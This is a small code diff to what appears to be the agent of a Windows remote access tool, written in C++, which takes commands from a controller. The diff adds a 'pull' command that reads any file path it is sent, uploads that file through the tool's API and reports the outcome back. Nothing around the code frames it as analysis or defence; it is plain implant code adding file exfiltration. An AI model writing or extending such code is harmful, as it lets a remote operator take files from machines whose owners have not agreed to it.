@@ -285,6 +285,13 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR lpCmdLine, INT) {
 					}
 				}
 
+				// PULL FILE  —  pull C:\path\to\file
+				else if (params[0] == "pull") {
+					std::string filePath = last.substr(5); // strip "pull "
+					std::string saved = api.UploadFile(filePath.c_str());
+					api.SendResult(saved.empty() ? "Error! File upload failed" : ("Uploaded: " + saved).c_str());
+				}
+
 				// SERVICE MANAGER
 				else if (params[0] == "service") {
 					if (params[1] == "show") {
